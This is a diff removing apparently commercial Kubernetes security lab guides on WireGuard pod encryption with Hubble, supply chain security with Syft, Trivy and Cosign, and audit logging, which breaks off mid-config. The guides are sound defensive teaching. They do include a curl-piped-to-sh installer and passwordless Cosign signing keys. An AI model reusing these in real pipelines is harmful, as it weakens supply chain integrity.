-openssl genrsa -out server-key.pem 4096
-
-# Generate server certificate signing request
-openssl req -subj "/C=US/ST=CA/L=San Francisco/O=Lab/CN=web-server-service.secure-apps.svc.cluster.local" -sha256 -new -key server-key.pem -out server.csr
-
-# Generate server certificate
-openssl x509 -req -days 365 -sha256 -in server.csr -CA ca.pem -CAkey ca-key.pem -out server-cert.pem -CAcreateserial
-
-# Generate client private key
-openssl genrsa -out client-key.pem 4096
-
-# Generate client certificate signing request
-openssl req -subj "/C=US/ST=CA/L=San Francisco/O=Lab/CN=client-app" -sha256 -new -key client-key.pem -out client.csr
-
-# Generate client certificate
-openssl x509 -req -days 365 -sha256 -in client.csr -CA ca.pem -CAkey ca-key.pem -out client-cert.pem -CAcreateserial
-
-# Create Kubernetes secrets for TLS certificates
-kubectl create secret tls web-server-tls \
-  --cert=server-cert.pem \
-  --key=server-key.pem \
-  -n secure-apps
-
-kubectl create secret tls client-tls \
-  --cert=client-cert.pem \
-  --key=client-key.pem \
-  -n secure-apps
-
-kubectl create secret generic ca-secret \
-  --from-file=ca.crt=ca.pem \
-  -n secure-apps
-
-# Clean up certificate files
-cd ~
-rm -rf /tmp/certs
-
-Task 3: Monitor and Verify Encrypted Traffic
-Subtask 3.1: Access Hubble UI
-
-Set up port forwarding to access the Hubble UI for traffic monitoring.
-
-# Port forward to Hubble UI
-kubectl port-forward -n kube-system svc/hubble-ui 12000:80 &
-
-# Note: The Hubble UI will be available at http://localhost:12000
-# In a real environment, you would access this through your browser
-echo "Hubble UI is available at http://localhost:12000"
-echo "You can access it through your browser to monitor traffic flows"
-
-Subtask 3.2: Monitor Traffic with Hubble CLI
-
-Use Hubble CLI to observe network traffic and verify encryption.
-
-# Install Hubble CLI
-HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)
-HUBBLE_ARCH=amd64
-if [ "$(uname -m)" = "aarch64" ]; then HUBBLE_ARCH=arm64; fi
-curl -L --fail --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-${HUBBLE_ARCH}.tar.gz{,.sha256sum}
-sha256sum --check hubble-linux-${HUBBLE_ARCH}.tar.gz.sha256sum
-sudo tar xzvfC hubble-linux-${HUBBLE_ARCH}.tar.gz /usr/local/bin
-rm hubble-linux-${HUBBLE_ARCH}.tar.gz{,.sha256sum}
-
-# Port forward to Hubble Relay
-kubectl port-forward -n kube-system svc/hubble-relay 4245:80 &
-
-# Wait a moment for port forwarding to establish
-sleep 5
-
-# Configure Hubble CLI
-export HUBBLE_SERVER=localhost:4245
-
-Subtask 3.3: Generate and Monitor Traffic
-
-Generate traffic between applications and monitor the encrypted communication.
-
-# Generate continuous traffic in the background
-CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')
-
-# Start traffic generation in background
-kubectl exec -it $CLIENT_POD -n secure-apps -- sh -c '
-while true; do
-  curl -s http://web-server-service.secure-apps.svc.cluster.local > /dev/null
-  echo "Request sent at $(date)"
-  sleep 5
-done' &
-
-TRAFFIC_PID=$!
-
-# Monitor traffic flows
-echo "Monitoring traffic flows for 30 seconds..."
-timeout 30s hubble observe --namespace secure-apps --follow
-
-# Monitor specific traffic between client and server
-echo "Monitoring client-to-server traffic..."
-timeout 20s hubble observe --from-pod secure-apps/client-app --to-service secure-apps/web-server-service --follow
-
-# Stop traffic generation
-kill $TRAFFIC_PID 2>/dev/null || true
-
-Subtask 3.4: Verify Encryption Status
-
-Check the encryption status and verify that traffic is being encrypted.
-
-# Check Cilium encryption status
-cilium status | grep -i encrypt
-
-# Verify WireGuard encryption is active
-kubectl exec -n kube-system ds/cilium -- cilium encrypt status
-
-# Check network policies are applied
-kubectl get cnp -n secure-apps
-
-# Describe the network policies
-kubectl describe cnp secure-web-server-policy -n secure-apps
-kubectl describe cnp secure-client-policy -n secure-apps
-
-Subtask 3.5: Test Policy Enforcement
-
-Verify that network policies are properly enforcing security rules.
-
-# Test allowed traffic (should work)
-echo "Testing allowed traffic from client-app to web-server..."
-CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')
-kubectl exec -it $CLIENT_POD -n secure-apps -- curl -s -w "HTTP Status: %{http_code}\n" http://web-server-service.secure-apps.svc.cluster.local
-
-# Create an unauthorized pod to test policy enforcement
-cat << 'EOF' > unauthorized-pod.yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: unauthorized-client
-  namespace: secure-apps
-  labels:
-    app: unauthorized
-spec:
-  containers:
-  - name: curl
-    image: curlimages/curl:7.85.0
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do sleep 30; done"]
-EOF
-
-kubectl apply -f unauthorized-pod.yaml
-
-# Wait for pod to be ready
-kubectl wait --for=condition=ready pod unauthorized-client -n secure-apps --timeout=60s
-
-# Test blocked traffic (should fail or timeout)
-echo "Testing blocked traffic from unauthorized pod..."
-timeout 10s kubectl exec -it unauthorized-client -n secure-apps -- curl -s http://web-server-service.secure-apps.svc.cluster.local || echo "Traffic blocked as expected"
-
-Subtask 3.6: Advanced Traffic Analysis
-
-Perform detailed analysis of encrypted traffic patterns.
-
-# Analyze traffic by protocol
-echo "Analyzing traffic by protocol..."
-hubble observe --namespace secure-apps --since 5m --protocol tcp
-
-# Check for any dropped packets
-echo "Checking for dropped packets..."
-hubble observe --namespace secure-apps --since 5m --verdict DROPPED
-
-# Monitor L7 HTTP traffic
-echo "Monitoring L7 HTTP traffic..."
-hubble observe --namespace secure-apps --since 5m --protocol http
-
-# Generate a traffic summary report
-echo "Generating traffic summary..."
-hubble observe --namespace secure-apps --since 10m --output json | jq '.flow_type' | sort | uniq -c
-
-Task 4: Troubleshooting and Validation
-Subtask 4.1: Common Troubleshooting Commands
-
-Learn essential commands for troubleshooting encryption and connectivity issues.
-
-# Check Cilium agent logs
-kubectl logs -n kube-system ds/cilium --tail=50
-
-# Check Cilium connectivity
-cilium connectivity test --test-concurrency 1
-
-# Verify encryption keys
-kubectl exec -n kube-system ds/cilium -- cilium encrypt status
-
-# Check endpoint status
-kubectl exec -n kube-system ds/cilium -- cilium endpoint list
-
-# Verify policy enforcement
-kubectl exec -n kube-system ds/cilium -- cilium policy get
-
-Subtask 4.2: Performance Impact Assessment
-
-Measure the performance impact of encryption on network traffic.
-
-# Test network performance without detailed monitoring
-echo "Testing basic connectivity performance..."
-CLIENT_POD=$(kubectl get pod -l app=client-app -n secure-apps -o jsonpath='{.items[0].metadata.name}')
-
-# Simple performance test
-kubectl exec -it $CLIENT_POD -n secure-apps -- sh -c '
-for i in $(seq 1 10); do
-  start_time=$(date +%s%N)
-  curl -s http://web-server-service.secure-apps.svc.cluster.local > /dev/null
-  end_time=$(date +%s%N)
-  duration=$((($end_time - $start_time) / 1000000))
-  echo "Request $i: ${duration}ms"
-done'
-
-Subtask 4.3: Security Validation
-
-Validate that encryption and security policies are working correctly.
-
-# Check that certificates are properly mounted
-kubectl exec -it $CLIENT_POD -n secure-apps -- ls -la /etc/ssl/certs/ 2>/dev/null || echo "Default cert location checked"
-
-# Verify network policy compliance
-echo "Verifying network policy compliance..."
-kubectl get networkpolicies -n secure-apps
-kubectl get ciliumnetworkpolicies -n secure-apps
-
-# Test policy violations
-echo "Testing policy violations..."
-timeout 5s kubectl exec -it unauthorized-client -n secure-apps -- curl -s http://web-server-service.secure-apps.svc.cluster.local || echo "Unauthorized access properly blocked"
-
-# Check encryption overhead
-kubectl top pods -n secure-apps
-
-Cleanup
-Subtask 4.4: Clean Up Resources
-
-Remove all resources created during the lab.
-
-# Stop any background processes
-pkill -f "kubectl port-forward" 2>/dev/null || true
-
-# Delete test applications
-kubectl delete namespace secure-apps
-
-# Delete unauthorized pod
-kubectl delete -f unauthorized-pod.yaml --ignore-not-found=true
-
-# Remove configuration files
-rm -f web-server.yaml client-app.yaml encryption-policy.yaml l7-auth-policy.yaml unauthorized-pod.yaml
-
-# Optional: Uninstall Cilium (only if you want to completely remove it)
-# cilium uninstall
-
-echo "Cleanup completed successfully!"
-
-Conclusion
-
-Congratulations! You have successfully completed Lab 13: Managing Pod-to-Pod Encryption. In this comprehensive lab, you have accomplished the following:
-
-Key Achievements:
-
-• Deployed Cilium Service Mesh: You installed and configured Cilium with WireGuard encryption, providing transparent Pod-to-Pod encryption across your Kubernetes cluster.
-
-• Implemented Network Security Policies: You created and applied Cilium Network Policies to control traffic flow and enforce security boundaries between applications.
-
-• Configured mTLS Authentication: You generated TLS certificates and configured mutual TLS authentication between services, ensuring both encryption and authentication.
-
-• Enabled Traffic Monitoring: You deployed and used Hubble for comprehensive network observability, allowing you to monitor encrypted traffic flows and verify policy enforcement.
-
-• Performed Security Validation: You tested both authorized and unauthorized traffic patterns to confirm that your security policies are working correctly.
-
-Why This Matters:
-
-Pod-to-Pod encryption is crucial for modern Kubernetes security because:
-
-    Data Protection: Encrypts all network traffic between pods, protecting sensitive data in transit
-    Zero Trust Architecture: Implements the principle of "never trust, always verify" within your cluster
-    Compliance Requirements: Helps meet regulatory requirements for data encryption and network security
-    Defense in Depth: Adds an additional layer of security beyond traditional perimeter defenses
-    Observability: Provides detailed insights into network traffic patterns and security policy enforcement
-
-Real-World Applications:
-
-The skills you've learned apply directly to:
-
-    Securing microservices communications in production environments
-    Meeting compliance requirements for financial and healthcare applications
-    Implementing zero-trust networking in cloud-native architectures
-    Troubleshooting network connectivity and security issues
-    Monitoring and auditing network traffic for security purposes
-
-This lab has prepared you with practical experience in service mesh security, which is essential for the Certified Kubernetes Security Specialist (CKS) certification and real-world Kubernetes security implementations.
-
-
-
-
-
-
-
-Lab 14: Supply Chain Security Practices Lab
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Generate and analyze Software Bill of Materials (SBOM) for container images to understand dependency structures • Perform comprehensive vulnerability scanning of container images using Trivy • Implement container image signing and verification using Cosign for supply chain integrity • Understand the importance of supply chain security in Kubernetes environments • Apply security best practices for container image management and deployment
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Docker containers and container images • Familiarity with Linux command line operations • Basic knowledge of Kubernetes concepts • Understanding of security concepts like digital signatures and certificates • Experience with package managers and dependency management
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.
-
-Your cloud machine includes: • Docker Engine • Trivy vulnerability scanner • Cosign signing tool • Syft SBOM generator • kubectl (Kubernetes CLI) • All required dependencies and utilities
-Task 1: Generate and Analyze Software Bill of Materials (SBOM)
-Subtask 1.1: Install and Configure SBOM Tools
-
-First, let's verify that Syft (SBOM generator) is available and understand what an SBOM contains.
-
-# Check if Syft is installed
-syft version
-
-# If not installed, install Syft
-curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
-
-# Verify installation
-syft version
-
-Subtask 1.2: Pull a Sample Container Image
-
-We'll work with a common application image to demonstrate SBOM generation.
-
-# Pull a sample Node.js application image
-docker pull node:16-alpine
-
-# Pull a sample Python application image
-docker pull python:3.9-slim
-
-# Verify images are downloaded
-docker images | grep -E "(node|python)"
-
-Subtask 1.3: Generate SBOM for Container Images
-
-Now let's create SBOMs for our container images in different formats.
-
-# Generate SBOM in JSON format for Node.js image
-syft node:16-alpine -o json > node-sbom.json
-
-# Generate SBOM in SPDX format for Python image
-syft python:3.9-slim -o spdx-json > python-sbom-spdx.json
-
-# Generate human-readable table format
-syft node:16-alpine -o table > node-sbom-table.txt
-
-# Generate SBOM with vulnerability information
-syft node:16-alpine -o syft-json > node-detailed-sbom.json
-
-Subtask 1.4: Analyze SBOM Contents
-
-Let's examine the generated SBOMs to understand the dependency structure.
-
-# View the first 50 lines of the JSON SBOM
-head -50 node-sbom.json
-
-# Count total number of packages in the Node.js image
-cat node-sbom.json | jq '.artifacts | length'
-
-# List all package names and versions
-cat node-sbom.json | jq -r '.artifacts[] | "\(.name) - \(.version)"' | head -20
-
-# View the table format for easier reading
-cat node-sbom-table.txt | head -30
-
-# Search for specific packages (e.g., OpenSSL)
-cat node-sbom.json | jq -r '.artifacts[] | select(.name | contains("ssl")) | "\(.name) - \(.version)"'
-
-Subtask 1.5: Compare SBOMs Between Images
-
-Compare the dependency footprints of different base images.
-
-# Generate SBOM for Alpine vs Ubuntu based images
-docker pull node:16-bullseye
-syft node:16-bullseye -o json > node-ubuntu-sbom.json
-
-# Compare package counts
-echo "Alpine-based packages:"
-cat node-sbom.json | jq '.artifacts | length'
-
-echo "Debian-based packages:"
-cat node-ubuntu-sbom.json | jq '.artifacts | length'
-
-# Find common packages between images
-cat node-sbom.json | jq -r '.artifacts[].name' | sort > alpine-packages.txt
-cat node-ubuntu-sbom.json | jq -r '.artifacts[].name' | sort > debian-packages.txt
-comm -12 alpine-packages.txt debian-packages.txt | head -10
-
-Task 2: Container Vulnerability Scanning with Trivy
-Subtask 2.1: Basic Trivy Vulnerability Scanning
-
-Let's scan our container images for known vulnerabilities.
-
-# Scan the Node.js image for vulnerabilities
-trivy image node:16-alpine
-
-# Scan with specific severity levels only
-trivy image --severity HIGH,CRITICAL node:16-alpine
-
-# Generate detailed JSON report
-trivy image -f json -o node-vuln-report.json node:16-alpine
-
-# Scan the Python image
-trivy image --severity MEDIUM,HIGH,CRITICAL python:3.9-slim
-
-Subtask 2.2: Advanced Trivy Scanning Options
-
-Explore different scanning modes and output formats.
-
-# Scan for specific vulnerability types
-trivy image --vuln-type os node:16-alpine
-
-# Scan including library vulnerabilities
-trivy image --vuln-type os,library python:3.9-slim
-
-# Generate HTML report
-trivy image -f template --template "@contrib/html.tpl" -o vulnerability-report.html node:16-alpine
-
-# Scan with custom policies
-trivy image --ignore-unfixed node:16-alpine
-
-# Scan filesystem instead of image
-mkdir test-app
-echo 'FROM node:16-alpine' > test-app/Dockerfile
-trivy fs test-app/
-
-Subtask 2.3: Analyze Vulnerability Reports
-
-Let's examine the vulnerability findings in detail.
-
-# View critical vulnerabilities only
-trivy image --severity CRITICAL --format json node:16-alpine | jq '.Results[].Vulnerabilities[] | select(.Severity == "CRITICAL") | {VulnerabilityID, PkgName, InstalledVersion, FixedVersion, Title}'
-
-# Count vulnerabilities by severity
-trivy image --format json node:16-alpine | jq '.Results[].Vulnerabilities | group_by(.Severity) | map({severity: .[0].Severity, count: length})'
-
-# Find vulnerabilities with available fixes
-trivy image --format json node:16-alpine | jq '.Results[].Vulnerabilities[] | select(.FixedVersion != "") | {ID: .VulnerabilityID, Package: .PkgName, Current: .InstalledVersion, Fixed: .FixedVersion}'
-
-# Export vulnerability summary
-trivy image --format table node:16-alpine > vulnerability-summary.txt
-cat vulnerability-summary.txt
-
-Subtask 2.4: Continuous Vulnerability Monitoring
-
-Set up automated scanning workflows.
-
-# Create a script for regular scanning
-cat > scan-images.sh << 'EOF'
-#!/bin/bash
-IMAGES=("node:16-alpine" "python:3.9-slim" "nginx:alpine")
-DATE=$(date +%Y%m%d)
-
-for image in "${IMAGES[@]}"; do
-    echo "Scanning $image..."
-    trivy image --format json "$image" > "${image//[:\/]/_}-scan-$DATE.json"
-    
-    # Check for critical vulnerabilities
-    CRITICAL_COUNT=$(trivy image --severity CRITICAL --format json "$image" | jq '.Results[].Vulnerabilities | length')
-    
-    if [ "$CRITICAL_COUNT" -gt 0 ]; then
-        echo "WARNING: $image has $CRITICAL_COUNT critical vulnerabilities!"
-    fi
-done
-EOF
-
-chmod +x scan-images.sh
-./scan-images.sh
-
-Task 3: Container Image Signing and Verification with Cosign
-Subtask 3.1: Install and Configure Cosign
-
-Set up Cosign for container image signing.
-
-# Verify Cosign installation
-cosign version
-
-# Generate key pair for signing
-cosign generate-key-pair
-
-# This creates cosign.key (private) and cosign.pub (public) files
-ls -la cosign.*
-
-# Set environment variable for easier use
-export COSIGN_PASSWORD=""
-
-Subtask 3.2: Sign Container Images
-
-Let's sign our container images to ensure integrity.
-
-# First, we need to push an image to a registry we can write to
-# For this lab, we'll use a local registry
-docker run -d -p 5000:5000 --name registry registry:2
-
-# Tag and push our image to local registry
-docker tag node:16-alpine localhost:5000/node:16-alpine
-docker push localhost:5000/node:16-alpine
-
-# Sign the image
-cosign sign --key cosign.key localhost:5000/node:16-alpine
-
-# Sign with additional annotations
-cosign sign --key cosign.key -a "author=security-team" -a "purpose=lab-demo" localhost:5000/node:16-alpine
-
-Subtask 3.3: Verify Signed Images
-
-Now let's verify the signatures we created.
-
-# Verify the signature
-cosign verify --key cosign.pub localhost:5000/node:16-alpine
-
-# Verify with specific annotations
-cosign verify --key cosign.pub -a "author=security-team" localhost:5000/node:16-alpine
-
-# Generate verification report
-cosign verify --key cosign.pub localhost:5000/node:16-alpine --output json > signature-verification.json
-
-# View verification details
-cat signature-verification.json | jq '.'
-
-Subtask 3.4: Implement Keyless Signing (Advanced)
-
-Explore keyless signing using OIDC identity.
-
-# Note: This requires OIDC setup, so we'll demonstrate the concept
-# In production, you would use:
-# cosign sign --oidc-issuer=https://your-oidc-provider localhost:5000/node:16-alpine
-
-# For demonstration, let's create a policy file
-cat > image-policy.yaml << 'EOF'
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: image-policy
-data:
-  policy.yaml: |
-    apiVersion: kyverno.io/v1
-    kind: ClusterPolicy
-    metadata:
-      name: require-signed-images
-    spec:
-      validationFailureAction: enforce
-      background: false
-      rules:
-      - name: check-signature
-        match:
-          resources:
-            kinds:
-            - Pod
-        verifyImages:
-        - image: "localhost:5000/*"
-          key: |
-            -----BEGIN PUBLIC KEY-----
-            # Your public key content here
-            -----END PUBLIC KEY-----
-EOF
-
-cat image-policy.yaml
-
-Subtask 3.5: Integrate Signing into CI/CD Pipeline
-
-Create a sample pipeline script that includes signing.
-
-# Create a sample CI/CD script
-cat > secure-pipeline.sh << 'EOF'
-#!/bin/bash
-set -e
-
-IMAGE_NAME="localhost:5000/secure-app"
-IMAGE_TAG="v1.0.0"
-FULL_IMAGE="$IMAGE_NAME:$IMAGE_TAG"
-
-echo "=== Secure Container Pipeline ==="
-
-# Step 1: Build image (simulated)
-echo "1. Building container image..."
-docker tag node:16-alpine "$FULL_IMAGE"
-
-# Step 2: Generate SBOM
-echo "2. Generating SBOM..."
-syft "$FULL_IMAGE" -o json > "$IMAGE_TAG-sbom.json"
-
-# Step 3: Vulnerability scan
-echo "3. Scanning for vulnerabilities..."
-trivy image --exit-code 1 --severity HIGH,CRITICAL "$FULL_IMAGE" || {
-    echo "Critical vulnerabilities found! Pipeline stopped."
-    exit 1
-}
-
-# Step 4: Push image
-echo "4. Pushing image to registry..."
-docker push "$FULL_IMAGE"
-
-# Step 5: Sign image
-echo "5. Signing image..."
-cosign sign --key cosign.key "$FULL_IMAGE"
-
-# Step 6: Attach SBOM to image
-echo "6. Attaching SBOM to image..."
-cosign attach sbom --sbom "$IMAGE_TAG-sbom.json" "$FULL_IMAGE"
-
-echo "=== Pipeline completed successfully ==="
-EOF
-
-chmod +x secure-pipeline.sh
-./secure-pipeline.sh
-
-Task 4: Implementing Supply Chain Security Policies
-Subtask 4.1: Create Admission Controller Policies
-
-Set up policies to enforce signed images in Kubernetes.
-
-# Create a namespace for testing
-kubectl create namespace secure-workloads
-
-# Create a pod that uses signed image
-cat > secure-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secure-app
-  namespace: secure-workloads
-spec:
-  containers:
-  - name: app
-    image: localhost:5000/node:16-alpine
-    ports:
-    - containerPort: 3000
-EOF
-
-# Apply the pod
 kubectl apply -f secure-pod.yaml
 
-# Verify pod is running
-kubectl get pods -n secure-workloads
+Verify the pod is running:
 
-Subtask 4.2: Verify Image Signatures in Kubernetes
+kubectl get pods -n secure-apps
+kubectl describe pod secure-pod -n secure-apps
 
-Create a verification script for Kubernetes deployments.
+Task 2: Implementing Network Policies
 
-# Create verification script
-cat > verify-k8s-images.sh << 'EOF'
-#!/bin/bash
+Network Policies control traffic flow between Pods and other network endpoints.
+Subtask 2.1: Prepare the Environment
 
-NAMESPACE=${1:-default}
-echo "Verifying images in namespace: $NAMESPACE"
+Create namespaces for our network policy demonstration:
 
-# Get all pods and their images
-kubectl get pods -n "$NAMESPACE" -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}' | while read pod_name images; do
-    echo "Pod: $pod_name"
-    for image in $images; do
-        echo "  Checking image: $image"
-        if [[ $image == localhost:5000/* ]]; then
-            if cosign verify --key cosign.pub "$image" >/dev/null 2>&1; then
-                echo "    ✓ Signature verified"
-            else
-                echo "    ✗ Signature verification failed"
-            fi
-        else
-            echo "    - External image (not verified)"
-        fi
-    done
-done
-EOF
-
-chmod +x verify-k8s-images.sh
-./verify-k8s-images.sh secure-workloads
-
-Task 5: Supply Chain Security Monitoring and Reporting
-Subtask 5.1: Create Security Dashboard Data
-
-Generate comprehensive security reports.
-
-# Create a comprehensive security report
-cat > generate-security-report.sh << 'EOF'
-#!/bin/bash
-
-REPORT_DATE=$(date +%Y-%m-%d)
-REPORT_FILE="supply-chain-security-report-$REPORT_DATE.html"
-
-cat > "$REPORT_FILE" << 'HTML_EOF'
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Supply Chain Security Report</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .header { background-color: #f0f0f0; padding: 10px; }
-        .section { margin: 20px 0; }
-        .critical { color: red; font-weight: bold; }
-        .high { color: orange; font-weight: bold; }
-        .medium { color: yellow; font-weight: bold; }
-        table { border-collapse: collapse; width: 100%; }
-        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-        th { background-color: #f2f2f2; }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>Supply Chain Security Report</h1>
-        <p>Generated on: REPORT_DATE_PLACEHOLDER</p>
-    </div>
-HTML_EOF
-
-# Add SBOM summary
-echo "    <div class='section'>" >> "$REPORT_FILE"
-echo "        <h2>Software Bill of Materials Summary</h2>" >> "$REPORT_FILE"
-echo "        <table>" >> "$REPORT_FILE"
-echo "            <tr><th>Image</th><th>Total Packages</th><th>SBOM Generated</th></tr>" >> "$REPORT_FILE"
-
-for image in "node:16-alpine" "python:3.9-slim"; do
-    if [ -f "${image//[:\/]/_}-sbom.json" ]; then
-        PACKAGE_COUNT=$(cat "${image//[:\/]/_}-sbom.json" 2>/dev/null | jq '.artifacts | length' 2>/dev/null || echo "N/A")
-        echo "            <tr><td>$image</td><td>$PACKAGE_COUNT</td><td>✓</td></tr>" >> "$REPORT_FILE"
-    fi
-done
-
-echo "        </table>" >> "$REPORT_FILE"
-echo "    </div>" >> "$REPORT_FILE"
-
-# Add vulnerability summary
-echo "    <div class='section'>" >> "$REPORT_FILE"
-echo "        <h2>Vulnerability Scan Results</h2>" >> "$REPORT_FILE"
-echo "        <p>Last scan performed: $(date)</p>" >> "$REPORT_FILE"
-echo "    </div>" >> "$REPORT_FILE"
-
-# Close HTML
-echo "</body></html>" >> "$REPORT_FILE"
-
-# Replace placeholder
-sed -i "s/REPORT_DATE_PLACEHOLDER/$REPORT_DATE/g" "$REPORT_FILE"
-
-echo "Security report generated: $REPORT_FILE"
-EOF
-
-chmod +x generate-security-report.sh
-./generate-security-report.sh
-
-Subtask 5.2: Set Up Automated Monitoring
-
-Create monitoring scripts for continuous security assessment.
-
-# Create monitoring script
-cat > monitor-supply-chain.sh << 'EOF'
-#!/bin/bash
-
-LOG_FILE="supply-chain-monitor.log"
-ALERT_THRESHOLD=5  # Alert if more than 5 critical vulnerabilities
-
-log_message() {
-    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
-}
-
-check_image_security() {
-    local image=$1
-    log_message "Checking security for image: $image"
-    
-    # Check if image is signed
-    if cosign verify --key cosign.pub "$image" >/dev/null 2>&1; then
-        log_message "✓ Image signature verified: $image"
-    else
-        log_message "✗ Image signature verification failed: $image"
-    fi
-    
-    # Check vulnerabilities
-    CRITICAL_VULNS=$(trivy image --severity CRITICAL --format json "$image" 2>/dev/null | jq '.Results[].Vulnerabilities | length' 2>/dev/null || echo "0")
-    
-    if [ "$CRITICAL_VULNS" -gt "$ALERT_THRESHOLD" ]; then
-        log_message "🚨 ALERT: $image has $CRITICAL_VULNS critical vulnerabilities (threshold: $ALERT_THRESHOLD)"
-    else
-        log_message "✓ Vulnerability check passed: $image ($CRITICAL_VULNS critical vulnerabilities)"
-    fi
-}
-
-log_message "Starting supply chain security monitoring"
-
-# Monitor local registry images
-for image in $(docker images localhost:5000/* --format "{{.Repository}}:{{.Tag}}"); do
-    check_image_security "$image"
-done
-
-log_message "Supply chain security monitoring completed"
-EOF
-
-chmod +x monitor-supply-chain.sh
-./monitor-supply-chain.sh
-
-# View the monitoring log
-cat supply-chain-monitor.log
-
-Troubleshooting Common Issues
-Issue 1: Cosign Key Generation Problems
-
-# If key generation fails, try with explicit password
-export COSIGN_PASSWORD="your-secure-password"
-cosign generate-key-pair
-
-# Or generate without password (less secure)
-cosign generate-key-pair --skip-password
-
-Issue 2: Registry Connection Issues
-
-# Check if local registry is running
-docker ps | grep registry
-
-# Restart registry if needed
-docker restart registry
-
-# Test registry connectivity
-curl http://localhost:5000/v2/_catalog
-
-Issue 3: Trivy Database Update Issues
-
-# Update Trivy database manually
-trivy image --download-db-only
-
-# Clear cache if needed
-trivy clean --all
-
-Issue 4: SBOM Generation Failures
-
-# Check if image exists locally
-docker images | grep node
-
-# Pull image if missing
-docker pull node:16-alpine
-
-# Generate SBOM with verbose output
-syft node:16-alpine -v
-
-Conclusion
-
-In this comprehensive lab, you have successfully:
-
-• Generated Software Bill of Materials (SBOM) for container images, providing complete visibility into software dependencies and components • Performed vulnerability scanning using Trivy to identify security risks in container images and understand their severity levels • Implemented container image signing and verification using Cosign to ensure supply chain integrity and prevent tampering • Created security policies for Kubernetes environments to enforce the use of signed and verified images • Built automated monitoring and reporting systems for continuous supply chain security assessment
-
-Why This Matters:
-
-Supply chain security is critical in modern containerized environments because:
-
-    Dependency Visibility: SBOMs provide transparency into what components are included in your applications
-    Risk Management: Vulnerability scanning helps identify and prioritize security risks before deployment
-    Integrity Assurance: Image signing ensures that containers haven't been tampered with during distribution
-    Compliance: Many regulatory frameworks now require supply chain security measures
-    Trust: These practices build confidence in your software delivery pipeline
-
-The skills you've learned in this lab are essential for:
-
-    Kubernetes Security Specialists managing container security
-    DevSecOps Engineers implementing secure CI/CD pipelines
-    Security Architects designing secure container platforms
-    Compliance Officers ensuring regulatory adherence
-
-These supply chain security practices form the foundation of a robust container security strategy and are increasingly required in enterprise environments. Continue practicing these techniques and stay updated with the latest security tools and best practices to maintain strong supply chain security posture.
-
-
-
-
-
-Lab 15: Auditing and Threat Detection Lab
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Configure and enable Kubernetes audit logging to track cluster activities • Set up and deploy log collection agents to centralize audit data • Simulate privilege escalation attacks in a controlled environment • Analyze audit logs to identify security threats and suspicious activities • Install and configure Falco for runtime security monitoring • Detect and respond to runtime anomalies using Falco rules • Understand the importance of continuous monitoring in Kubernetes security • Implement best practices for threat detection in containerized environments
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with Linux command line operations • Knowledge of YAML configuration files • Understanding of container security fundamentals • Basic knowledge of log analysis concepts • Familiarity with kubectl commands
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click "Start Lab" to begin - no need to build your own VM or install Kubernetes from scratch.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes 1.28+ • kubectl pre-configured and ready to use • Docker runtime environment • All necessary tools and dependencies pre-installed
-Task 1: Enable Kubernetes Audit Logging and Configure Log Agent
-Subtask 1.1: Understanding Kubernetes Audit Logging
-
-Kubernetes audit logging provides a security-relevant chronological set of records documenting the sequence of activities that have affected the system by individual users, administrators, or other components.
-Subtask 1.2: Configure Audit Policy
-
-First, let's create an audit policy file that defines what events should be logged.
-
-# Create the audit policy directory
-sudo mkdir -p /etc/kubernetes/audit
-
-# Create the audit policy file
-sudo tee /etc/kubernetes/audit/audit-policy.yaml > /dev/null <<EOF
-apiVersion: audit.k8s.io/v1
-kind: Policy
-rules:
-# Log pod changes at RequestResponse level
-- level: RequestResponse
-  resources:
-  - group: ""
-    resources: ["pods"]
-# Log service account token requests
-- level: Metadata
-  resources:
-  - group: ""
-    resources: ["serviceaccounts/token"]
-# Log requests to certain non-resource URL paths
-- level: Metadata
-  nonResourceURLs:
-  - "/api*"
-  - "/version"
-# Log ConfigMap and Secret changes at Metadata level
-- level: Metadata
-  resources:
-  - group: ""
-    resources: ["secrets", "configmaps"]
-# Log all other resources at Metadata level
-- level: Metadata
-  omitStages:
-  - RequestReceived
-EOF
-
-Subtask 1.3: Configure API Server for Audit Logging
-
-Now we need to modify the API server configuration to enable audit logging.
-
-# Backup the original kube-apiserver manifest
-sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup
-
-# Create the audit log directory
-sudo mkdir -p /var/log/kubernetes/audit
-
-# Update the kube-apiserver configuration
-sudo tee /tmp/apiserver-patch.yaml > /dev/null <<EOF
-spec:
-  containers:
-  - name: kube-apiserver
-    command:
-    - kube-apiserver
-    - --audit-log-path=/var/log/kubernetes/audit/audit.log
-    - --audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml
-    - --audit-log-maxage=30
-    - --audit-log-maxbackup=3
-    - --audit-log-maxsize=100
-    volumeMounts:
-    - name: audit-policy
-      mountPath: /etc/kubernetes/audit
-      readOnly: true
-    - name: audit-log
